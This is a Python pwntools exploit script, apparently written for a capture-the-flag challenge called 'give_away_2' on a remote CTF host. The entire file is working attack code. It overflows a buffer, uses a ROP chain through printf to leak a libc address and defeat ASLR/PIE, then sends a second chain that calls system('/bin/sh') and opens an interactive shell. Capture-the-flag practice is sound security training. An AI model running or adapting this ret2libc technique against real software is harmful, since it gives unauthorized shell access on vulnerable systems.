import sys
from pwn import *

offset = 40

main = 0x864
pop_rdi = 0x00000903
ret = 0x00000676
printf_got = 0x200fc0
printf_plt = 0x690

if sys.argv[1] == "r":
    printf_offset = 0x0000000000064e80
    system_offset = 0x000000000004f440
    binsh_offset = 0x1b3e9a
    r = remote("sharkyctf.xyz", 20335)
else:
    printf_offset = 0x0000000000057220
    system_offset = 0x0000000000049100
    binsh_offset = 0x18b143
    r = process("give_away_2")
    print(r.pid)
    sleep(5)

# get main addr
r.recvuntil("Give away: ")
main_addr = int(r.recvline(), 16)
elf_base = main_addr - main
pop_rdi_addr = elf_base + pop_rdi
ret_addr = elf_base + ret
printf_got_addr = elf_base + printf_got
printf_plt_addr = elf_base + printf_plt

# leak libc_base
payload = b"A" * offset
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(printf_got_addr)
payload += p64(printf_plt_addr)
payload += p64(ret_addr)
payload += p64(main_addr)
r.sendline(payload)

printf_addr = r.recvuntil("Give away: ")[:-11]
printf_addr = u64(printf_addr + b"\x00" * (8 - len(printf_addr)))
libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info("system_addr = {}".format(hex(system_addr)))
log.info("binsh_addr = {}".format(hex(binsh_addr)))

# attack
payload = b"A" * offset
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)
r.sendline(payload)

r.interactive()
